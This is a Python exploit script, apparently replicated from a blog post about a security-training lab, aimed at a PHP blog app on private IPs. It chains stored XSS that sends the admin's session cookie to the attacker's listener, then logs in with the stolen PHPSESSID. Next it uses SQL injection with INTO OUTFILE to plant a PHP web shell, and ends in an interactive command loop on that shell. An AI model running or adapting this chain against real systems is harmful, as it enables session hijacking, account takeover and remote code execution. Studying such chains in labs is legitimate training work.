# this is replicated from this blog https://sarthaksaini.com/2019/awae/xss-rce.html
import requests
from random import randint
import re
import socket
import sys
import os


r = requests.session()

target_url = "http://192.168.81.132/"

attacker_ip = "192.168.29.88"
proxy={'http':'http://192.168.29.11:8080'}

def trigger():

    print("[+] Creating xss vector")
    port = 8000
    vector = "<script>var img=document.createElement('img'); img.src='http://{}:{}?/cook='+escape(document.cookie); document.getElementById('body').appendChild(img);</script>".format(attacker_ip,port)
    print("[+] sending xss vector")
    sender(vector,port)

def sender(vector,port):
    url  = target_url+"post_comment.php?id=1"
    data = {'title':'adsas','author':'aaa','text':vector,'submit':'Submit'}
    
    out = r.post(url=url, data=data,proxies=proxy)
    if out.status_code ==200:
        print("[+] xss payload sent Succesfully")
        cookie = servers(port)
        login_admin(cookie)

def servers(port):
    HOST = '192.168.29.88'
    print("[+] random port")
    print(port)
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.bind((HOST, port))
        s.listen(1)
        conn, addr = s.accept()
        print(addr)
        with conn:
            m = conn.recv(2048)
        
            print("[+] xss triggered capturing cookies to login")
            print(m.decode('utf-8'))
            out = re.findall("PHPSESSID=.*HTTP",m.decode('utf-8'))
            print(out)
            out = out[0].replace("PHPSESSID=","").replace("HTTP","")
            return(out.replace("\n","").replace("\t",""))

def login_admin(cookie):
    url = target_url+"admin/index.php"
    print("[+] cookies before login")
    
    cookie="PHPSESSID={}".format(cookie)
    print(cookie)
    head = {'User-Agent':'Mozilla/5.0 (X11; Linux x86_64; rv:67.0) Gecko/20100101 Firefox/67.0','Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8','Accept-Language': 'en-US,en;q=0.5',
'Accept-Encoding': 'gzip, deflate',
'Connection': 'close',
'Cookie': cookie}
    
    
    a = r.get(url=url,headers=head, proxies=proxy)
    #print(a.text)
    if a.text.find("Administration of my Blog"):
        print("[+] Login Successful")
        shell_upload(r,head)
    else:
        print("[-] Login Failed")
        sys.exit()

def shell_upload(r, head):
    url = target_url+"admin/edit.php?id=-1%20union%20select%20\"<?php\",\"system($_GET[%27c%27]);\",\"?>\",\";\"%20into%20outfile%20\"/var/www/css/lol1.php\"%23"
    r.get(url=url,headers=head, proxies=proxy)
    shell_url = target_url+"css/lol1.php"
    
    test = r.get(url=shell_url,headers=head, proxies=proxy)
    if test.text.find("Notice: Undefined index:"):
        print("[+] shell uploaded")
        shell_interact(r,head)
    else:
        print("[-] shell upload failed")
        sys.exit()

def shell_interact(r,head):
    shell_url = target_url+"css/lol1.php"
    while True:
        cmd=input("cmd>")
        if cmd=="exit":
            url=shell_url+"?c=rm lol1.php"
            r.get(url,headers=head,proxies=proxy)
            sys.exit()
        else:
            url = shell_url+"?c={}".format(cmd)
        print(r.get(url,headers=head, proxies=proxy).text.replace(";",""))


trigger();

